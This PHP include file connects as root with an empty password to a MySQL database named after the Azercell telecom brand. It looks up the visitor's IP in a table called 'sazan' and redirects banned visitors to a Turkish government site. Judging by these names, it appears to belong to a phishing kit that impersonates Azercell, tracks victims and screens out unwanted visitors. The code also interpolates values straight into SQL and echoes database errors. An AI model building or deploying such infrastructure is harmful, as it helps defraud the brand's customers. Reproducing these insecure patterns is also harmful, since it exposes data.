<?php
$ip = $_SERVER['REMOTE_ADDR'];

$servername = "localhost";
$username   = "root";
$password   = "";
$dbname     = "azercell";

try {
     $db = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->exec("SET NAMES UTF8");
    }
catch(PDOException $e)
    {
     echo $e->getMessage();
    }
$site = $db->query("SELECT * FROM site WHERE id ='1'")->fetch();
$now = $db->query("SELECT * FROM sazan WHERE ip = '{$ip}'");
$ban=$now->fetch();
if(isset($ban['ban'])){
if($ban['ban'] == "1"){ 
    header('Location:http://www.turkiye.gov.tr');
} }
?>